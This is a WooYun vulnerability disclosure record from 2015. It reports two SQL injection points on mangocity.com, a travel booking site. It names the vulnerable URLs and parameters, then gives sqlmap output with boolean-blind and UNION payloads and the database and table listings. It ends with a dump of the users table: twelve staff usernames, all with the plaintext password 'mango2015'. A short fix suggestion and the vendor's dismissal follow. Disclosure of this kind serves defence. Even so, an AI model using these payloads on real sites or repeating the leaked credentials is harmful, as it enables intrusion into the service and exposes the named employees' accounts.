{"id": 21212, "wybug_id": "wooyun-2015-0123585", "wybug_title": "芒果网两处SQL注入（密码明文存储）", "wybug_corp": "芒果网", "wybug_author": "路人甲", "wybug_date": "2015-06-30 09:42", "wybug_open_date": "2015-07-05 09:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["密码明文存储"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-05：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  主站SQL注入密码明文存储注入点1：\nhttp://www.mangocity.com/product/10506752p2.html?type=90&c=cholidayindexcontroller&m=comindex&d=grouptraveltype参数存在注入\n注入点2：\nhttp://www.mangocity.com/index.php/freeline/productinfo_controller/journey_print?thirdpartid=214412p2thirdpartid参数存在注入\n   漏洞证明：  \nsqlmap identified the following injection points with a total of 183 HTTP(s) requests:---Parameter: type (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=90 AND 1118=1118&c=cholidayindexcontroller&m=comindex&d=grouptravel    Type: UNION query    Title: MySQL UNION query (90) - 9 columns    Payload: type=-4130 UNION ALL SELECT 90,90,90,90,90,90,90,90,CONCAT(0x7176787171,0x4c736767644348706b7a,0x7178706271)#&c=cholidayindexcontroller&m=comindex&d=grouptravel---web application technology: PHP 5.3.28back-end DBMS: MySQL >= 5.0.0current user:    'vacation@10.10.4.55'current database:    'vacation_init'current user is DBA:    Falseavailable databases [3]:[*] information_schema[*] test[*] vacation_initsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: type (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=90 AND 1118=1118&c=cholidayindexcontroller&m=comindex&d=grouptravel    Type: UNION query    Title: MySQL UNION query (90) - 9 columns    Payload: type=-4130 UNION ALL SELECT 90,90,90,90,90,90,90,90,CONCAT(0x7176787171,0x4c736767644348706b7a,0x7178706271)#&c=cholidayindexcontroller&m=comindex&d=grouptravel---web application technology: PHP 5.3.28back-end DBMS: MySQL 5Database: vacation_init[37 tables]+-----------------------------+| album                       || album_relationships         || business_module             || business_module_bak20150419 || business_type               || common_config               || keyword                     || media                       || pm_params                   || pm_tui                      || pm_tui_bak20150618          || product                     || product_accommodation       || product_additional          || product_album               || product_arrival             || product_departure           || product_departure_month     || product_detail              || product_detail_item         || product_extra               || product_itinerary           || product_journey             || product_journey_album       || product_journey_event       || product_journey_event_album || product_lineinfo            || product_scenery             || product_tag                 || product_theme               || product_type                || temp_update_product         || term_relationships          || term_taxonomy               || terms                       || user_role                   || users                       |+-----------------------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: type (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=90 AND 1118=1118&c=cholidayindexcontroller&m=comindex&d=grouptravel    Type: UNION query    Title: MySQL UNION query (90) - 9 columns    Payload: type=-4130 UNION ALL SELECT 90,90,90,90,90,90,90,90,CONCAT(0x7176787171,0x4c736767644348706b7a,0x7178706271)#&c=cholidayindexcontroller&m=comindex&d=grouptravel---back-end DBMS: MySQL 5Database: vacation_initTable: users[3 columns]+----------+-------------+| Column   | Type        |+----------+-------------+| password | varchar(10) || roleId   | int(10)     || username | varchar(20) |+----------+-------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: type (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=90 AND 1118=1118&c=cholidayindexcontroller&m=comindex&d=grouptravel    Type: UNION query    Title: MySQL UNION query (90) - 9 columns    Payload: type=-4130 UNION ALL SELECT 90,90,90,90,90,90,90,90,CONCAT(0x7176787171,0x4c736767644348706b7a,0x7178706271)#&c=cholidayindexcontroller&m=comindex&d=grouptravel---web application technology: PHP 5.3.28back-end DBMS: MySQL 5sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: type (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=90 AND 1118=1118&c=cholidayindexcontroller&m=comindex&d=grouptravel    Type: UNION query    Title: MySQL UNION query (90) - 9 columns    Payload: type=-4130 UNION ALL SELECT 90,90,90,90,90,90,90,90,CONCAT(0x7176787171,0x4c736767644348706b7a,0x7178706271)#&c=cholidayindexcontroller&m=comindex&d=grouptravel---web application technology: PHP 5.3.28back-end DBMS: MySQL 5Database: vacation_initTable: users[12 entries]+-------------+-----------+--------+| username    | password  | roleId |+-------------+-----------+--------+| chenhuan    | mango2015 | 0      || chenjie     | mango2015 | 0      || cms         | mango2015 | 0      || liuchunyan  | mango2015 | 0      || panwei      | mango2015 | 0      || pengwenhui  | mango2015 | 0      || renxianglin | mango2015 | 0      || songwanbing | mango2015 | 0      || sunbaoyu    | mango2015 | 0      || wuhongbo    | mango2015 | 0      || xujia       | mango2015 | 0      || zhanglan    | mango2015 | 0      |+-------------+-----------+--------+\n   修复方案：  参数过滤密码储方式修改为加密存储   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-05 09:44 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-30 10:07 |    \t\t染血の雪 \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:16        | 击缻)\t\t \n  看到历史记录一片忽略~    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}